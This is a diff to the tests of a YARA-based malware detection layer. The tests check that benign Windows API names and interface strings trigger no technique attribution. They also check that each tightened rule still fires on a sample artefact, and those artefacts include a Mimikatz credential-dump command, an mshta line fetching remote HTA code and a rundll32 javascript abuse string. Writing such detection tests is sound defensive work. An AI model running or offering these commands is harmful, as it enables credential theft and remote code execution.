@@ -367,6 +367,18 @@ def _fired(data: bytes) -> set[str]:
     return {match.rule_id for match in layer.scan(data, sample_platform="windows")}
 
 
+def _asserted(data: bytes) -> dict[str, str]:
+    """The techniques the corpus asserts on these bytes, by rule."""
+    layer = YaraLayer.from_default_rules()
+    if layer.rule_count == 0:
+        pytest.skip("Default rules file not found.")
+    return {
+        match.rule_id: match.technique_id
+        for match in layer.scan(data, sample_platform="windows")
+        if match.technique_id
+    }
+
+
 class TestTheRunKeyRuleWantsARunKey:
     def test_the_name_of_the_api_is_not_persistence(self) -> None:
         """`RegSetValueEx` is how a program writes any value anywhere. The rule
@@ -389,3 +401,77 @@ class TestThePackingRulesWantAPackerArtefact:
         fired = _fired(_A_PACKED_SAMPLE)
         assert "obfuscation_indicators" in fired
         assert "software_packing" in fired
+
+
+# Two benign fixtures, both built from names and words rather than from any
+# sample's bytes. The first is the conservative one: API names a signed GUI
+# network client imports and nothing else. The second adds the resource and
+# interface strings such a program also carries.
+_IMPORTED_NAMES = (
+    b"RegSetValueExA\x00RegCreateKeyExA\x00RegQueryValueExA\x00RegDeleteKeyA\x00"
+    b"CreateServiceW\x00StartServiceW\x00OpenSCManagerW\x00\x00"
+    b"FindFirstFileW\x00FindNextFileW\x00GetLogicalDrives\x00GetDriveTypeW\x00"
+    b"HttpSendRequestA\x00InternetOpenUrlA\x00WinHttpConnect\x00"
+    b"IsDebuggerPresent\x00GetCursorPos\x00GetForegroundWindow\x00GetLastInputInfo\x00"
+    b"ShellExecuteA\x00DllRegisterServer\x00CryptEncrypt\x00CryptDecrypt\x00"
+    b"CreateObject\x00"
+)
+_WITH_INTERFACE_TEXT = _IMPORTED_NAMES + (
+    b"Bitcoin address book\x00macroblock size\x00create a shortcut\x00"
+    b"scrollbar.png\x00encrypt the session\x00Decrypt failed\x00"
+    b"zlib compression\x00compress packet\x00AES-GCM\x00%COMSPEC%\x00"
+    b"aes256-ctr\x00uPXfer window\x00Software\\SimonTatham\\PuTTY\\Sessions\x00"
+)
+
+
+class TestTheCorpusAssertsNothingAboutABenignClient:
+    """Every rule in the file, over a benign GUI network client.
+
+    Thirteen rules used to fire on one: a pattern that is a substring of a
+    benign API name (`RegSetValue`, `CreateService`, `ExecuteA`), a pattern
+    that is an English word (`encrypt`, `macro`, `shortcut`), a pattern too
+    short to be evidence (`#24` at 0.91), and a pattern the MSVC CRT links in
+    (`IsDebuggerPresent`). Each carried a technique and an authored confidence
+    into the pack every agent reads.
+    """
+
+    def test_the_api_names_alone_assert_no_technique(self) -> None:
+        assert _asserted(_IMPORTED_NAMES) == {}
+
+    def test_the_interface_strings_assert_no_technique(self) -> None:
+        assert _asserted(_WITH_INTERFACE_TEXT) == {}
+
+    def test_what_still_fires_says_so_without_a_technique(self) -> None:
+        """The notes are allowed to fire — they name what is there and claim
+        nothing — and they carry no confidence to be read as one."""
+        layer = YaraLayer.from_default_rules()
+        if layer.rule_count == 0:
+            pytest.skip("Default rules file not found.")
+        for match in layer.scan(_WITH_INTERFACE_TEXT, sample_platform="windows"):
+            assert match.technique_id == ""
+            assert match.confidence is None
+
+
+class TestEachTightenedRuleStillFiresOnItsArtefact:
+    ARTEFACTS = [
+        ("registry_run_keys", b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00"),
+        ("obfuscation_indicators", b"UPX0\x00UPX1\x00UPX!\x00"),
+        ("software_packing", b"UPX0\x00UPX1\x00"),
+        ("registry_modification", b"Software\\Policies\\System\\EnableLUA\x00"),
+        ("sandbox_evasion", b"CheckRemoteDebuggerPresent\x00vboxservice\x00"),
+        ("lsass_dump", b"sekurlsa::logonpasswords\x00"),
+        ("rundll32_abuse", b'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"\x00'),
+        ("mshta_abuse", b"mshta http://198.51.100.9/a.hta\x00"),
+        ("ransomware_indicators", b"ALL YOUR FILES ARE ENCRYPTED\x00_readme.txt\x00"),
+        ("phishing_attachment", b"AutoOpen\x00vbaProject.bin\x00"),
+        ("cmd_execution", b"cmd.exe /c start payload\x00"),
+        ("vbs_execution", b"WScript.Shell\x00cscript.exe\x00"),
+    ]
+
+    @pytest.mark.parametrize(("rule_id", "artefact"), ARTEFACTS)
+    def test_the_artefact_still_fires_the_rule(self, rule_id: str, artefact: bytes) -> None:
+        assert rule_id in _fired(artefact)
+
+    @pytest.mark.parametrize(("rule_id", "artefact"), ARTEFACTS)
+    def test_the_rule_still_carries_its_technique(self, rule_id: str, artefact: bytes) -> None:
+        assert _asserted(artefact).get(rule_id)
